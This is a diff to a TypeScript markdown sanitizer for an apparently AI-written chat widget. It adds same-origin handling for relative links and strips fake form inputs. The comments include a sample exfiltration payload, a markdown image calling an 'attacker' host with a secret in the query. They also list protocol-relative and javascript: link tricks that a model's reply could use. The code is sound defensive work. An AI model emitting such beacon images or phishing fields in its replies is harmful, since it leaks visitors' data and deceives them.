@@ -31,9 +31,8 @@
 //     customer's whole page away; and a plain [x](url) link, having no target,
 //     loaded inside the 520px widget frame.
 //   • Only http:, https:, mailto: and tel: hrefs survive; anything else
-//     (relative, protocol-relative, ftp:, data:, javascript:) loses its href
-//     and renders as inert text. Relative links would resolve against the
-//     widget's origin, not the customer's site, so they are wrong either way.
+//     (protocol-relative, ftp:, data:, javascript:) loses its href and renders
+//     as inert text. (Relative hrefs: see the follow-up paragraph below.)
 //   • `img` is gone. A model-written image is a request fired on render, which
 //     makes ![](https://attacker/p?d=secret) an exfiltration beacon. Markdown
 //     images render as their escaped ALT TEXT (least surprising: the sentence
@@ -47,6 +46,14 @@
 // other sanitize call; the image renderer lives on a private Marked instance
 // so the global `marked` is untouched. Product-card image_url (lib/cards.ts)
 // is a separate, Svelte-bound path and is not affected.
+//
+// 2026-09-26 (follow-up): site-relative hrefs (`/returns`, `returns`) are the
+// common grounded citation, so they no longer become dead text. main.ts calls
+// setLinkBase(config.parentOrigin) at boot; a relative href resolves against
+// that origin and is kept only if it stays on it (so `//evil`, `/\evil` still
+// drop). With no valid origin (missing, '*', has a path, non-http) relative
+// hrefs are dropped as before. And `input` now survives only as a disabled
+// type=checkbox (GFM task list); every other input type is removed.
 
 import { Marked } from 'marked';
 import DOMPurify from 'dompurify';
@@ -73,12 +80,43 @@ export const MARKDOWN_ALLOWED_ATTR = [
 
 const SAFE_LINK_PROTOCOLS = new Set(['http:', 'https:', 'mailto:', 'tel:']);
 
-function isSafeHref(href: string): boolean {
+// Host page origin that site-relative hrefs resolve against. Set once at boot
+// (main.ts → setLinkBase(config.parentOrigin)); null means "unknown", and then
+// relative hrefs are dropped as before.
+let linkBase: string | null = null;
+
+/** Accept only an exact http(s) ORIGIN (no path, no '*'); anything else clears
+ *  the base so relative links fall back to being dropped. */
+export function setLinkBase(origin: string | null | undefined): void {
+  linkBase = null;
+  if (!origin) return;
   try {
-    // No base URL: relative and protocol-relative hrefs throw and are dropped.
-    return SAFE_LINK_PROTOCOLS.has(new URL(href).protocol);
+    const u = new URL(origin);
+    if ((u.protocol === 'https:' || u.protocol === 'http:') && u.origin === origin) linkBase = origin;
   } catch {
-    return false;
+    /* not a URL — leave the base unset */
+  }
+}
+
+/** Return the href to keep, or null to drop it. Absolute hrefs must use an
+ *  allowlisted scheme. A relative href is resolved against linkBase and kept
+ *  only if it lands on that SAME origin — which is what rejects
+ *  protocol-relative `//evil`, and the `/\evil` / `\\evil` spellings browsers
+ *  also read as protocol-relative, without having to enumerate them. */
+function safeHref(href: string): string | null {
+  let absolute: URL | null = null;
+  try {
+    absolute = new URL(href);
+  } catch {
+    /* relative — handled below */
+  }
+  if (absolute) return SAFE_LINK_PROTOCOLS.has(absolute.protocol) ? href : null;
+  if (!linkBase) return null;
+  try {
+    const resolved = new URL(href, linkBase + '/');
+    return resolved.origin === linkBase ? resolved.href : null;
+  } catch {
+    return null;
   }
 }
 
@@ -111,9 +149,21 @@ function getPurifier(): ReturnType<typeof DOMPurify> {
   if (purifier) return purifier;
   const p = DOMPurify(window);
   p.addHook('afterSanitizeAttributes', (node) => {
+    if (node.nodeName === 'INPUT') {
+      // Only the GFM task-list checkbox is legitimate here. Any other input
+      // (text, password, submit, ...) is a fake form field a reply could use
+      // to phish the visitor, so it goes; the checkbox is forced read-only.
+      if ((node.getAttribute('type') ?? '').toLowerCase() !== 'checkbox') node.remove();
+      else node.setAttribute('disabled', '');
+      return;
+    }
     if (node.nodeName !== 'A') return;
     const href = node.getAttribute('href');
-    if (href !== null && !isSafeHref(href)) node.removeAttribute('href');
+    if (href !== null) {
+      const kept = safeHref(href);
+      if (kept === null) node.removeAttribute('href');
+      else if (kept !== href) node.setAttribute('href', kept);
+    }
     node.setAttribute('target', '_blank');
     node.setAttribute('rel', 'noopener noreferrer');
   });
